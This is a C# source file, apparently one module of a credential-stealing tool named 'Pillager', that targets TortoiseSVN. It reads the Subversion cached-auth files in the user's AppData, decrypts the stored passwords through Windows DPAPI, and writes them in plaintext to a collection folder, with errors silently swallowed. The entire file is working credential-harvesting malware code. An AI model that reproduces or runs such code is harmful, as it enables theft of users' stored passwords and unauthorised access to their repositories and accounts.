using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Pillager.Tools
{
    internal class TortoiseSVN
    {
        public static string ToolName = "TortoiseSVN";

        public static string Decrypt(string input)
        {
            try
            {
                return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(input), null,
                    DataProtectionScope.CurrentUser));
            }
            catch
            {
                return input;
            }
        }

        public static void Save(string path)
        {
            try
            {
                string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Subversion\\auth\\svn.simple");
                if (!Directory.Exists(folder)) return;
                string[] files = Directory.GetFiles(folder, new String('?', 32));
                if (files.Length == 0) return;
                string savepath = Path.Combine(path, ToolName);
                Directory.CreateDirectory(savepath);
                foreach (string file in files)
                {
                    string[] lines = File.ReadAllLines(file);
                    bool encrypted = false;
                    for (int i = 0; i < lines.Length; i++)
                    {
                        if (lines[i] == "passtype" && i > 1 && lines[i - 1].StartsWith("K ") && i + 2 < lines.Length && lines[i + 2] == "wincrypt")
                        {
                            encrypted = true;
                        }
                    }
                    for (int i = 0; i < lines.Length; i++)
                    {
                        if (lines[i] == "password" && i > 1 && lines[i - 1].StartsWith("K ") && i + 2 < lines.Length && encrypted)
                        {
                            lines[i + 2] = Decrypt(lines[i + 2]);
                        }
                    }
                    File.WriteAllLines(Path.Combine(savepath, "svn.simple.decrypted"), lines);
                }
            }
            catch { }
        }
    }
}
